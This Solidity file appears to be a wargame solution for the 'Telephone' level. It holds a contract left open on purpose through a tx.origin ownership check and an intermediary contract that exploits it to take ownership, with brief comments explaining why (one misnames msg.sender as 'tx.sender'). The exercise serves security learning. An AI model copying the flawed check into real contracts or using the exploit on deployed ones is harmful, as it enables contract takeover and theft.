// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Telephone {
  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

//Why?
//tx.origin = who started this at first (user who called the ChangeOwner function)
//tx.sender = who call current function (smartcontract ChangeOwner)

contract ChangeOwner {
    Telephone _telephone;

    constructor(address _telephoneAddress) {
        _telephone = Telephone(_telephoneAddress);
    }

    function changeOwner(address newOwner) external {
        _telephone.changeOwner(newOwner);
    }
}